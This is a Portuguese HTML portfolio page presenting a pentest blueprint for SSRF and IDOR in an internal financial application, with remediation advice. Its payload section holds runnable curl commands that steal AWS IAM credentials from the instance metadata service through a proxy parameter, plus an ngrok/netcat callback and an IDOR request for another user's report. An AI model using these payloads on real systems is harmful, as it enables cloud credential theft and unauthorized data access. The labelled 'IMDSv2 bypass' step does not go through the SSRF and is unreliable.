<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacker √âtico: Pentest SSRF & Broken Access Control | AI Specialists Showcase</title>
    <meta name="description" content="Blueprint enterprise-grade de penetration testing focado em SSRF e Broken Access Control, com payloads execut√°veis e ROI de 25.9x.">
    <link rel="stylesheet" href="../styles.css">
</head>
<body>
    <!-- Navigation -->
    <nav class="nav">
        <div class="nav-container">
            <a href="../index.html" class="nav-logo">ü§ñ AI Specialists Showcase</a>
            <div class="nav-links">
                <a href="../index.html">Home</a>
                <a href="developer-websocket.html">Developer</a>
                <a href="devops-mlops.html">DevOps</a>
                <a href="security-confidential-computing.html">Security</a>
                <a href="hacker-pentest-ssrf.html" class="active">Hacker √âtico</a>
            </div>
        </div>
    </nav>

    <!-- Hero Section -->
    <section class="hero specialist-hero">
        <div class="container">
            <div class="hero-content">
                <div class="specialist-badge">üõ°Ô∏è Hacker √âtico Specialist</div>
                <h1 class="hero-title">Pentest Blueprint: SSRF & Broken Access Control</h1>
                <p class="hero-subtitle">
                    Blueprint enterprise-grade de penetration testing para aplica√ß√£o financeira, 
                    com foco em vulnerabilidades cr√≠ticas A01 e A10 da OWASP Top 10 2021
                </p>
                <div class="hero-stats">
                    <div class="stat-item">
                        <div class="stat-value">9.8/10</div>
                        <div class="stat-label">Quality Score</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">25.9x</div>
                        <div class="stat-label">ROI</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">$915K</div>
                        <div class="stat-label">Risco Mitigado</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-value">80h</div>
                        <div class="stat-label">Dura√ß√£o do Pentest</div>
                    </div>
                </div>
            </div>
        </div>
    </section>

    <!-- Business Context -->
    <section class="section">
        <div class="container">
            <h2 class="section-title">üìä Contexto de Neg√≥cio</h2>
            
            <div class="grid-2">
                <div class="card">
                    <h3>üéØ Problema Identificado</h3>
                    <p><strong>Aplica√ß√£o:</strong> FinanceControl (gest√£o financeira interna)</p>
                    <p><strong>Status Quo:</strong> Nunca passou por pentest manual aprofundado</p>
                    <p><strong>Risco Cr√≠tico:</strong></p>
                    <ul>
                        <li>Fraude interna por falhas de controle de acesso</li>
                        <li>Vazamento de dados estrat√©gicos via SSRF</li>
                        <li>Falha em auditorias SOX/ISO 27001</li>
                        <li>Pivoting para rede interna via metadados cloud</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>üí∞ ROI Detalhado</h3>
                    <table class="table">
                        <tr>
                            <th>Risco</th>
                            <th>Prob.</th>
                            <th>Impacto</th>
                            <th>Mitigado</th>
                        </tr>
                        <tr>
                            <td>Fraude Interna (BAC)</td>
                            <td>15%</td>
                            <td>$1.5M</td>
                            <td>$225K</td>
                        </tr>
                        <tr>
                            <td>Vazamento Dados (SSRF)</td>
                            <td>10%</td>
                            <td>$4.9M</td>
                            <td>$490K</td>
                        </tr>
                        <tr>
                            <td>Falha Auditoria SOX</td>
                            <td>40%</td>
                            <td>$250K</td>
                            <td>$100K</td>
                        </tr>
                        <tr>
                            <td>Pivoting Ransomware</td>
                            <td>5%</td>
                            <td>$2M</td>
                            <td>$100K</td>
                        </tr>
                        <tr class="highlight">
                            <td><strong>TOTAL</strong></td>
                            <td colspan="2"><strong>Investimento: $35.25K</strong></td>
                            <td><strong>$915K</strong></td>
                        </tr>
                    </table>
                    <div class="roi-badge">ROI: 25.9x</div>
                </div>
            </div>
        </div>
    </section>

    <!-- Technical Architecture -->
    <section class="section bg-dark">
        <div class="container">
            <h2 class="section-title">üèóÔ∏è Metodologia de Pentest (PTES)</h2>
            
            <div class="card">
                <h3>üìã 7 Fases do Penetration Testing Execution Standard</h3>
                <pre class="code-block">
1. [PRE-ENGAGEMENT]
   ‚îú‚îÄ Rules of Engagement (ROE) com foco em dados financeiros
   ‚îú‚îÄ Provisionamento de 3 contas de teste (Analyst, Manager, Admin)
   ‚îî‚îÄ Defini√ß√£o de canais de comunica√ß√£o de emerg√™ncia

2. [INTELLIGENCE GATHERING]
   ‚îú‚îÄ Mapeamento da aplica√ß√£o com as 3 contas de usu√°rio
   ‚îî‚îÄ Identifica√ß√£o de todos os par√¢metros controlados pelo usu√°rio

3. [THREAT MODELING]
   ‚îú‚îÄ Foco em atores internos (funcion√°rio curioso, mal-intencionado)
   ‚îî‚îÄ Vetores: manipula√ß√£o de par√¢metros, abuso de funcionalidades

4. [VULNERABILITY ANALYSIS] - FOCO PRINCIPAL
   ‚îú‚îÄ [A01] Testes de IDOR em todos os endpoints
   ‚îú‚îÄ [A01] Escalonamento vertical (Analyst ‚Üí Admin)
   ‚îú‚îÄ [A01] Escalonamento horizontal (Analyst A ‚Üí Analyst B)
   ‚îú‚îÄ [A10] An√°lise de funcionalidades que consomem URLs
   ‚îî‚îÄ [A10] Tentativas de acesso a servi√ßos internos (IMDS)

5. [EXPLOITATION]
   ‚îú‚îÄ [A01] PoC: Acessar relat√≥rio financeiro de outro usu√°rio
   ‚îî‚îÄ [A10] PoC: Extrair credenciais AWS via SSRF

6. [POST-EXPLOITATION]
   ‚îú‚îÄ Demonstrar impacto de neg√≥cio
   ‚îî‚îÄ Mapear cadeia de ataque completa

7. [REPORTING]
   ‚îú‚îÄ Relat√≥rio com PoCs replic√°veis
   ‚îî‚îÄ Recomenda√ß√µes t√°ticas e estrat√©gicas
                </pre>
            </div>

            <div class="grid-2" style="margin-top: 2rem;">
                <div class="card">
                    <h3>üéØ OWASP Top 10 2021</h3>
                    <table class="table">
                        <tr>
                            <th>ID</th>
                            <th>Vulnerabilidade</th>
                            <th>CVSS</th>
                        </tr>
                        <tr>
                            <td><span class="badge badge-critical">A01</span></td>
                            <td>Broken Access Control (IDOR)</td>
                            <td>8.8</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-critical">A10</span></td>
                            <td>Server-Side Request Forgery</td>
                            <td>9.1</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-high">A05</span></td>
                            <td>Security Misconfiguration</td>
                            <td>7.5</td>
                        </tr>
                        <tr>
                            <td><span class="badge badge-medium">A07</span></td>
                            <td>Authentication Failures</td>
                            <td>6.5</td>
                        </tr>
                    </table>
                </div>

                <div class="card">
                    <h3>‚öîÔ∏è MITRE ATT&CK Tactics</h3>
                    <ul class="tech-list">
                        <li><strong>TA0001:</strong> Initial Access</li>
                        <li><strong>T1190:</strong> Exploit Public-Facing Application</li>
                        <li><strong>T1087.001:</strong> Local Account Discovery</li>
                        <li><strong>T1110.001:</strong> Password Guessing</li>
                        <li><strong>T1210:</strong> Exploitation of Remote Services</li>
                        <li><strong>T1005:</strong> Data from Local System</li>
                        <li><strong>T1041:</strong> Exfiltration Over C2 Channel</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- Payloads Section -->
    <section class="section">
        <div class="container">
            <h2 class="section-title">üíª Payloads Execut√°veis</h2>

            <div class="card">
                <h3>üî¥ Explora√ß√£o de SSRF (AWS IMDS)</h3>
                <p><strong>Objetivo:</strong> Extrair credenciais tempor√°rias da inst√¢ncia AWS para obter acesso √† infraestrutura cloud.</p>
                
                <h4>Passo 1: Confirma√ß√£o da Vulnerabilidade (Out-of-Band Callback)</h4>
                <pre class="code-block"><code># Setup do listener
ngrok http 8080

# Envio do payload de callback
curl "https://app.empresa.com/api/v1/proxy?url=http://random-subdomain.ngrok.io"

# Valida√ß√£o: Se receber conex√£o no netcat, SSRF est√° confirmado
nc -lvp 8080</code></pre>

                <h4>Passo 2: Acesso ao Servi√ßo de Metadados (IMDSv1)</h4>
                <pre class="code-block"><code># 1. Listar categorias de metadados
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/"
# Resultado: ami-id, hostname, instance-id, iam/, etc.

# 2. Extrair o nome do IAM Role
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
# Resultado: EC2-Production-Role

# 3. Extrair as credenciais tempor√°rias (PROOF OF CONCEPT)
curl "https://app.empresa.com/api/v1/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"</code></pre>

                <h4>Resultado Esperado (JSON com credenciais):</h4>
                <pre class="code-block"><code>{
  "Code" : "Success",
  "LastUpdated" : "2024-05-21T10:30:00Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAXXXXXXXXXXXXXXXX",
  "SecretAccessKey" : "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
  "Token" : "IQoJb3JpZ2luX2VjE... (long token) ...",
  "Expiration" : "2024-05-21T16:45:00Z"
}</code></pre>

                <h4>Passo 3: Bypass do IMDSv2 (Se IMDSv1 falhar)</h4>
                <pre class="code-block"><code># 1. Obter token de sess√£o (requisi√ß√£o PUT)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. Usar o token para acessar os metadados
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Production-Role"</code></pre>
            </div>

            <div class="card" style="margin-top: 2rem;">
                <h3>üîµ Explora√ß√£o de Broken Access Control (IDOR)</h3>
                <p><strong>Objetivo:</strong> Validar se um usu√°rio pode acessar/modificar dados de outro usu√°rio.</p>

                <h4>Proof of Concept (PoC):</h4>
                <pre class="code-block"><code># 1. Login como Analyst A (user_id: 101) e obter token
# 2. Acessar um relat√≥rio leg√≠timo (reportId: 550, owner: 101)
curl -X GET 'https://finance.internal.corp/api/v1/reports/550' \
  -H 'Authorization: Bearer <TOKEN_ANALYST_A>'
# Resposta: 200 OK com dados do relat√≥rio 550

# 3. Tentar acessar um relat√≥rio de outro usu√°rio (reportId: 551, owner: 202 - Manager)
curl -X GET 'https://finance.internal.corp/api/v1/reports/551' \
  -H 'Authorization: Bearer <TOKEN_ANALYST_A>'
# Resposta ESPERADA: 403 Forbidden
# Resposta ATUAL: 200 OK (VULNERABILIDADE CONFIRMADA!)</code></pre>

                <h4>C√≥digo de Remedia√ß√£o (Python/Flask):</h4>
                <pre class="code-block"><code>@app.route('/api/v1/reports/&lt;int:report_id&gt;')
@login_required
def get_report(report_id):
    report = Report.query.get(report_id)
    
    # ‚úÖ CORRE√á√ÉO: Verificar propriedade do recurso
    if report.owner_id != current_user.id:
        return {"error": "Access denied"}, 403
    
    return report.to_json()</code></pre>
            </div>
        </div>
    </section>

    <!-- Tools & Stack -->
    <section class="section bg-dark">
        <div class="container">
            <h2 class="section-title">üõ†Ô∏è Ferramentas & Stack Tecnol√≥gico</h2>
            
            <div class="grid-3">
                <div class="card">
                    <h3>Web Application Testing</h3>
                    <ul class="tech-list">
                        <li><strong>Burp Suite Professional 2024.5+</strong></li>
                        <li>‚Ü≥ Autorize 2.1+ (automa√ß√£o BAC)</li>
                        <li>‚Ü≥ AuthMatrix 1.1+ (testes sistem√°ticos)</li>
                        <li><strong>OWASP ZAP 2.14+</strong></li>
                        <li>Alternativa open-source</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>SSRF Testing</h3>
                    <ul class="tech-list">
                        <li><strong>SSRFmap 1.0+</strong></li>
                        <li>Automa√ß√£o de explora√ß√£o</li>
                        <li><strong>Interactsh (ProjectDiscovery)</strong></li>
                        <li>OAST para Blind SSRF</li>
                        <li><strong>Python Scripts (requests 2.31+)</strong></li>
                        <li>PoCs customizados</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>Code Analysis (SAST)</h3>
                    <ul class="tech-list">
                        <li><strong>Semgrep 1.60+</strong></li>
                        <li>Regras r/python.lang.security.ssrf</li>
                        <li><strong>SonarQube Enterprise 10+</strong></li>
                        <li>An√°lise de controle de acesso</li>
                        <li><strong>GitHub Advanced Security</strong></li>
                        <li>CodeQL queries</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- Remediation -->
    <section class="section">
        <div class="container">
            <h2 class="section-title">üõ°Ô∏è Remedia√ß√£o & Controles de Seguran√ßa</h2>
            
            <div class="card">
                <h3>üìã Tabela de Remedia√ß√£o (4 Prioridades)</h3>
                <table class="table">
                    <tr>
                        <th>Prioridade</th>
                        <th>A√ß√£o</th>
                        <th>Detalhes T√©cnicos</th>
                        <th>Owner</th>
                        <th>Custo/Ano</th>
                    </tr>
                    <tr>
                        <td><span class="badge badge-critical">1. Imediata</span></td>
                        <td>Bloquear IMDS via WAF</td>
                        <td>Criar regra de WAF para bloquear 169.254.169.254. Configurar Egress rules nos Security Groups.</td>
                        <td>DevOps</td>
                        <td>$2K</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-high">2. Correta</span></td>
                        <td>Allow-List de URLs</td>
                        <td>Implementar lista estrita de dom√≠nios permitidos. Validar e sanitizar toda entrada do usu√°rio.</td>
                        <td>Backend Team</td>
                        <td>$0</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-high">3. Estrat√©gica</span></td>
                        <td>For√ßar IMDSv2</td>
                        <td>Configurar todas inst√¢ncias EC2 para exigir IMDSv2 (HttpTokens=required).</td>
                        <td>Cloud Security</td>
                        <td>$0</td>
                    </tr>
                    <tr>
                        <td><span class="badge badge-medium">4. Detectiva</span></td>
                        <td>Monitorar IMDS</td>
                        <td>CloudTrail + VPC Flow Logs para alertar acessos an√¥malos ao servi√ßo de metadados.</td>
                        <td>SOC</td>
                        <td>$5K</td>
                    </tr>
                </table>
            </div>

            <div class="grid-2" style="margin-top: 2rem;">
                <div class="card">
                    <h3>üîí Controles Preventivos</h3>
                    <ul class="tech-list">
                        <li><strong>Centralized Access Control:</strong> M√≥dulo central de verifica√ß√£o de permiss√µes</li>
                        <li><strong>Ownership Checks:</strong> Verificar owner_id em cada endpoint</li>
                        <li><strong>SSRF Egress Allow-list:</strong> Firewall com dom√≠nios confi√°veis</li>
                        <li><strong>Disable Cloud Metadata:</strong> Bloquear 169.254.169.254</li>
                        <li><strong>SAST Rules:</strong> SonarQube/Semgrep para detectar IDOR/SSRF</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>üëÅÔ∏è Controles Detectivos</h3>
                    <ul class="tech-list">
                        <li><strong>Security Logging:</strong> Logar todas tentativas de acesso negadas (403)</li>
                        <li><strong>Alert ap√≥s 5 falhas:</strong> Alerta em 1 minuto</li>
                        <li><strong>SIEM Integration:</strong> Splunk/ELK para correla√ß√£o de eventos</li>
                        <li><strong>Anomaly Detection:</strong> ML para detectar padr√µes anormais</li>
                        <li><strong>Threat Intelligence:</strong> Feed de IPs maliciosos</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- Compliance & Next Steps -->
    <section class="section bg-dark">
        <div class="container">
            <h2 class="section-title">üìú Compliance & Pr√≥ximos Passos</h2>
            
            <div class="grid-2">
                <div class="card">
                    <h3>‚úÖ Compliance Demonstrado</h3>
                    <ul class="tech-list">
                        <li><strong>Sarbanes-Oxley (SOX):</strong> Se√ß√£o 302/404 - Valida efic√°cia dos controles internos sobre relat√≥rios financeiros</li>
                        <li><strong>ISO 27001:2022:</strong> A.5.15 (Access Control), A.8.3 (Information access restriction)</li>
                        <li><strong>NIST CSF:</strong> PR.AC-4 (Access Control)</li>
                        <li><strong>PCI DSS v4.0:</strong> Requirement 6.2.4 (Secure coding)</li>
                    </ul>
                </div>

                <div class="card">
                    <h3>üìà 5 Pr√≥ximos Passos</h3>
                    <ol class="tech-list">
                        <li><strong>Aprovar Budget ($35.25K)</strong> - Owner: CISO - Timeline: 3 dias</li>
                        <li><strong>Definir ROE e Agendar</strong> - Owner: Security Lead - Timeline: 5 dias</li>
                        <li><strong>Executar Pentest (80h)</strong> - Owner: Vendor - Timeline: 2 semanas</li>
                        <li><strong>Triagem de Vulnerabilidades</strong> - Owner: App Owner - Timeline: 2 dias</li>
                        <li><strong>Remedia√ß√£o e Reteste</strong> - Owner: Dev Team - Timeline: 1-2 semanas</li>
                    </ol>
                </div>
            </div>
        </div>
    </section>

    <!-- Why This Matters -->
    <section class="section">
        <div class="container">
            <h2 class="section-title">üéØ Por Que Isso Importa?</h2>
            
            <div class="grid-3">
                <div class="card highlight">
                    <h3>üíº Para Executivos (C-Level)</h3>
                    <ul>
                        <li><strong>ROI de 25.9x</strong> - $915K de risco mitigado com investimento de $35.25K</li>
                        <li><strong>Compliance garantido</strong> - Aprova√ß√£o em auditorias SOX/ISO 27001</li>
                        <li><strong>Prote√ß√£o da reputa√ß√£o</strong> - Evitar data breach de $4.9M</li>
                        <li><strong>Zero custo operacional</strong> - Ap√≥s implementa√ß√£o das corre√ß√µes</li>
                    </ul>
                </div>

                <div class="card highlight">
                    <h3>üë®‚Äçüíº Para Recrutadores</h3>
                    <ul>
                        <li><strong>Metodologia profissional</strong> - PTES + MITRE ATT&CK + OWASP Top 10</li>
                        <li><strong>Expertise em cloud</strong> - AWS IMDS, GCP, Azure metadados</li>
                        <li><strong>Payloads execut√°veis</strong> - Curl commands prontos para reprodu√ß√£o</li>
                        <li><strong>Vis√£o de neg√≥cio</strong> - ROI, stakeholders, compliance mapeados</li>
                    </ul>
                </div>

                <div class="card highlight">
                    <h3>üë®‚Äçüíª Para Engenheiros</h3>
                    <ul>
                        <li><strong>PoCs replic√°veis</strong> - IDOR e SSRF com payloads reais</li>
                        <li><strong>C√≥digo de remedia√ß√£o</strong> - Python/Flask exemplo de corre√ß√£o</li>
                        <li><strong>Ferramentas enterprise</strong> - Burp Suite Pro, SSRFmap, Interactsh</li>
                        <li><strong>SAST integration</strong> - Semgrep rules para CI/CD</li>
                    </ul>
                </div>
            </div>
        </div>
    </section>

    <!-- CTA Section -->
    <section class="cta-section">
        <div class="container">
            <h2>Pronto para proteger seus sistemas cr√≠ticos?</h2>
            <p>Este blueprint de pentest pode ser adaptado para qualquer aplica√ß√£o enterprise.</p>
            <div class="cta-buttons">
                <a href="../index.html" class="btn btn-primary">‚Üê Voltar ao Showcase</a>
                <a href="https://github.com/demostenessilva" class="btn btn-secondary" target="_blank">Ver Mais Projetos ‚Üí</a>
            </div>
        </div>
    </section>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <p>&copy; 2025 AI Specialists Showcase. Developed by AI Aether (Claude Sonnet 4.5)</p>
            <p>Open Source Project - Enterprise-Grade Solutions</p>
        </div>
    </footer>
</body>
</html>

